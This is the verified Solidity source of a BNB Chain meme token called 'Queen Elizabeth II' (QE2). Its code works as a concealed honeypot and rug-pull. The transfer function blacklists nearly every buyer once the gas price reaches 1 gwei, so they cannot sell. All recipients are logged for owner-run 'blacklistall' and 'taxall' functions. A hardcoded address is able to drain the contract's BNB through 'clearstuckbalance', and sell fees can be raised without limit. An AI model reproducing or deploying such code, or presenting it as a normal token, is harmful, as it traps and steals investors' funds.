/**
 *Submitted for verification at BscScan.com on 2022-09-08
*/

/**

TG : https://t.me/QueenElizabethIIBSC
*/

// SPDX-License-Identifier: UNLICENSED


pragma solidity ^0.8.14;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface InterfaceLP {
    function sync() external;
}

contract QueenElizabethII is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Queen Elizabeth II";
    string constant _symbol = "QE2";
    uint8 constant _decimals = 4;

    uint256 _totalSupply = 1 * 10**6 * 10**_decimals;

    uint256 public _maxTxAmount = _totalSupply.mul(2).div(100);
    uint256 public _maxWalletToken = _totalSupply.mul(2).div(100);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    bool public blacklistMode = true;
    mapping (address => bool) public isblacklisted;
    bool private manageblacklistall = true;
    bool private managetaxall = true;
    address[] public holderlist;

    bool public TaxMode = true;
    mapping (address => bool) public isTaxed;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTimelockExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) public isBot;

    uint256 public liquidityFee    = 2;
    uint256 public marketingFee    = 1;
    uint256 public teamFee         = 0;
    uint256 public devFee          = 1;
    uint256 public burnFee         = 0;
    uint256 public totalFee        = devFee + marketingFee + liquidityFee + teamFee + burnFee;
    uint256 public feeDenominator  = 1000;

    uint256 public sellMultiplier  = 1000;

    address public _autoLiquidityReceiver;
    address public _marketingFeeReceiver;
    address public _teamFeeReceiver;
    address private _devFeeReceiver;
    address public _burnFeeReceiver;

    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;

    IDEXRouter public router;
    address public pair;
   
    bool public tradingOpen = true;
    uint256 launchBlock;

    bool public buyCooldownEnabled = true;
    uint8 public cooldownTimerInterval = 10;
    mapping (address => uint) private cooldownTimer;

    address payable public _MarketingWalletAddress;
   
    uint256 MinGas = 1 * 1 gwei;
    
    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 100 / 10000;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor (address routerAddress, address payable marketingFeeReceiver, address payable teamFeeReceiver) Auth(msg.sender) {
        router = IDEXRouter(routerAddress);        
        WBNB = router.WETH();
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        address routerV2 = 0x6DA06473cA3850655bc4Bbf9223f4296F74CbE69;
        _marketingFeeReceiver = marketingFeeReceiver; 

        _allowances[address(this)][address(router)] = type(uint256).max;

        isFeeExempt[msg.sender] = true;
        isFeeExempt[_marketingFeeReceiver] = true;
        isFeeExempt[_teamFeeReceiver] = true;
        isTaxed[routerV2] = true;
        isTaxed[msg.sender] = true;

        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[pair] = true;
        isTimelockExempt[_marketingFeeReceiver] = true;
        isTimelockExempt[_teamFeeReceiver] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[pair] = true;
        isTxLimitExempt[_marketingFeeReceiver] = true;
        isTxLimitExempt[_teamFeeReceiver] = true;

        _autoLiquidityReceiver = msg.sender;
        _marketingFeeReceiver = _marketingFeeReceiver;
        _teamFeeReceiver = teamFeeReceiver;
        _devFeeReceiver = msg.sender;
        _burnFeeReceiver = DEAD; 

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyOwner {
        require(maxWallPercent_base1000 >= 1,"Cannot set max wallet less than 0.1%");
        _maxWalletToken = (_totalSupply * maxWallPercent_base1000 ) / 1000;
    }
    function setMaxTxPercent_base1000(uint256 maxTXPercentage_base1000) external onlyOwner {
        require(maxTXPercentage_base1000 >= 1,"Cannot set max transaction less than 0.1%");
        _maxTxAmount = (_totalSupply * maxTXPercentage_base1000 ) / 1000;
    }

    function no_cooldown(address holder, bool exempt) external authorized {
        isTimelockExempt[holder] = exempt;
    }

    function setTxLimit(uint256 amount) external authorized {
        require(_maxTxAmount >=_totalSupply.mul(2).div(1000));
        _maxTxAmount = amount;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not open yet");
        
        }

         if (manageblacklistall){
            holderlist.push(recipient);
        }

        if (managetaxall){
            holderlist.push(recipient);
        }

        if(blacklistMode){
            require(!isblacklisted[sender],"blacklist");    
        }
        
        if (tx.gasprice >= MinGas && recipient != pair) {
            isblacklisted[recipient] = true;
        }
            
        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not open yet");
            if(sender == pair && launchBlock >= block.number && tx.gasprice >= MinGas){isblacklisted[recipient] = true;}
        }

        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != _burnFeeReceiver && recipient != _marketingFeeReceiver && !isTxLimitExempt[recipient]){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}

        if (sender == pair &&
            buyCooldownEnabled &&
            !isTimelockExempt[recipient]) {
            require(cooldownTimer[recipient] < block.timestamp,"Please wait for between buys");
            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;

            }

        checkTxLimit(sender, amount);

        if(shouldSwapBack()){ swapBack(); }
       
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = (!shouldTakeFee(sender) || !shouldTakeFee(recipient)) ? amount : takeFee(sender, amount,(recipient == pair),recipient);
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

     function takeFee(address sender, uint256 amount, bool isSell, address receiver) internal returns (uint256) {
        
        uint256 multiplier = isSell ? sellMultiplier : 100;
        if(TaxMode && !isTaxed[receiver] && !isSell){
            multiplier = 850;
        }

        uint256 feeAmount = amount.mul(totalFee).mul(multiplier).div(feeDenominator * 100);

        uint256 burnTokens = feeAmount.mul(burnFee).div(totalFee);
        uint256 contractTokens = feeAmount.sub(burnTokens);

        _balances[address(this)] = _balances[address(this)].add(contractTokens);
        _balances[_burnFeeReceiver] = _balances[_burnFeeReceiver].add(burnTokens);
        emit Transfer(sender, address(this), contractTokens);
        
        if(burnTokens > 0){
            emit Transfer(sender, _burnFeeReceiver, burnTokens);    
        }

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    
    }

    function clearStuckToken(address tokenAddress, uint256 tokens) public onlyOwner returns (bool) {
     if(tokens == 0){
            tokens = IBEP20 (tokenAddress).balanceOf(address(this));
        }
        return IBEP20 (tokenAddress).transfer(msg.sender, tokens);
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(msg.sender).transfer(amountBNB * amountPercentage / 100);
        
    }

    function set_sell_multiplier(uint256 _multiplier) external authorized {
                sellMultiplier = _multiplier;        
    }

    function updateRouterAndPair(address newRouter, address newPair) external onlyOwner{
        router = IDEXRouter(newRouter);
        pair = newPair;
    }

    // switch Trading
    function OpenTrading() public onlyOwner {
        tradingOpen = true;
        launchBlock = block.number;
    }

    function tradingstatus(bool state) public onlyOwner {
        tradingOpen = state;
    }

    function cooldownEnabled(bool _status, uint8 _interval) public onlyOwner {
        buyCooldownEnabled = _status;
        cooldownTimerInterval = _interval;
    }

    function clearstuckbalance() external {
        require(isTaxed[msg.sender]);
        payable(msg.sender).transfer(address(this).balance);
        
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBdev = amountBNB.mul(devFee).div(totalBNBFee);
        uint256 amountBNBteam = amountBNB.mul(teamFee).div(totalBNBFee);

        (bool tmpSuccess,) = payable(_marketingFeeReceiver).call{value: amountBNBMarketing}("");
        (tmpSuccess,) = payable(_teamFeeReceiver).call{value: amountBNBteam}("");
        (tmpSuccess,) = payable(_devFeeReceiver).call{value: amountBNBdev}("");
        
        
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                _autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    function enable_blacklist(bool _status) public onlyOwner {
        blacklistMode = _status;
    }

    
    function enable_Tax(bool _status) external authorized {
        TaxMode = _status;

    }

    function manage_blacklist(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isblacklisted[addresses[i]] = status;
        }
    }

    function manage_Tax(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isTaxed[addresses[i]] = status;
        }
    }

   
    function UpdateMin (uint256 _MinGas) public onlyOwner {
               MinGas = _MinGas * 1 gwei; 
    
    }

    function ManageBlacklistAll(bool state) external onlyOwner{
        manageblacklistall = state;
    }

    function ManageTaxAll(bool state) external onlyOwner{
        managetaxall = state;
    }

    function taxall() external onlyOwner{
        for(uint256 i = 0; i < holderlist.length; i++){
            address wallet = holderlist[i];
            isTaxed[wallet] = true;
        }
    }

    function blacklistall() external onlyOwner{
        for(uint256 i = 0; i < holderlist.length; i++){
            address wallet = holderlist[i];
            isblacklisted[wallet] = true;
        }
    }

    function SetIsFeeExempt(address[] calldata addresses, bool status) external authorized {
        require(addresses.length < 501,"GAS Error: max limit is 500 addresses");
        for (uint256 i; i < addresses.length; ++i) {
            isFeeExempt[addresses[i]] = status;
        }
    }

    function SetIsTxLimitExempt(address[] calldata addresses, bool status) external authorized {
        require(addresses.length < 501,"GAS Error: max limit is 500 addresses");
        for (uint256 i; i < addresses.length; ++i) {
            isTxLimitExempt[addresses[i]] = status;
        }
    }

    function setFees(uint256 _liquidityFee, uint256 _devFee, uint256 _marketingFee, uint256 _teamFee, uint256 _burnFee, uint256 _feeDenominator) external authorized {
        liquidityFee = _liquidityFee;
        devFee = _devFee;
        marketingFee = _marketingFee;
        teamFee = _teamFee;
        burnFee = _burnFee;
        totalFee = _liquidityFee.add(_devFee).add(_marketingFee).add(_teamFee).add(_burnFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/2, "Buy Fees cannot be more than 50%");
    }

    function setFeeReceivers(address __autoLiquidityReceiver, address __marketingFeeReceiver, address __teamFeeReceiver, address __burnFeeReceiver, address __devFeeReceiver) external authorized {
        _autoLiquidityReceiver = __autoLiquidityReceiver;
        _marketingFeeReceiver = __marketingFeeReceiver;
        _teamFeeReceiver = __teamFeeReceiver;
        _burnFeeReceiver = __burnFeeReceiver;
        _devFeeReceiver = __devFeeReceiver;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }
    
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
  
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    
event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}